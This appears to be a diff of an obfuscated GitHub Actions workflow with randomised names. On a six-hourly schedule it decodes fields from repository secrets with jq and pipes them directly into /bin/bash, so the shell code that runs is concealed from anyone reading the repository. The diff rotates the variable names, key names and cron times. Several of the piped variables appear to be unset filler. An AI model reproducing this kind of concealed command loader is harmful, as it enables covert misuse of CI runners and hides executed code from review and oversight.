@@ -1,29 +1,31 @@
 name: jeanspheasant
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
+    - cron: '39 5/6 * * *'
 
-jobs:  # 28656
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jeanspheasant
         env:
-          qgjt8493: ${{ secrets.qgjt8493 }}
+          kcnww8: ${{ secrets.kcnww8 }}
         run: |
-          echo $qgjt8493 | jq -r .yhegy1870 | /bin/bash
-          echo $ejs98214 | jq -r .f3 | /bin/bash
-          echo $m364 | jq -r .upvw2479 | /bin/bash
-          echo $qnql306 | jq -r .n98 | /bin/bash
-          echo $y55157 | jq -r .gej0295 | /bin/bash
-          echo $upuu4 | jq -r .oqbnz43 | /bin/bash
-          echo $m9 | jq -r .cfboz3 | /bin/bash
-          echo $a102 | jq -r .qpl4 | /bin/bash
-          echo $pdfm21 | jq -r .ghq881 | /bin/bash
-          echo $y8 | jq -r .fjene6 | /bin/bash
-          echo $n0 | jq -r .rll0 | /bin/bash
-          echo $r66 | jq -r .mreps7 | /bin/bash
+          echo $kcnww8 | jq -r .zt651 | /bin/bash
+          echo $j10 | jq -r .u9 | /bin/bash
+          echo $bvgy255 | jq -r .af58 | /bin/bash
+          echo $evrnl4413 | jq -r .qmc9 | /bin/bash
+          echo $hkqb085 | jq -r .ll75 | /bin/bash
+          echo $mdkh465 | jq -r .kiew996 | /bin/bash
+          echo $fdcd58 | jq -r .li8581 | /bin/bash
+          echo $cvavs7051 | jq -r .lil6506 | /bin/bash
+          echo $pdt50860 | jq -r .ptzn508 | /bin/bash
+          echo $ez5263 | jq -r .q5414 | /bin/bash
+          echo $x8 | jq -r .eoa55 | /bin/bash
+          echo $sp145 | jq -r .geb4 | /bin/bash
+          echo $hjqfw18523 | jq -r .muc43 | /bin/bash
+          echo $muef0 | jq -r .uq1 | /bin/bash
 
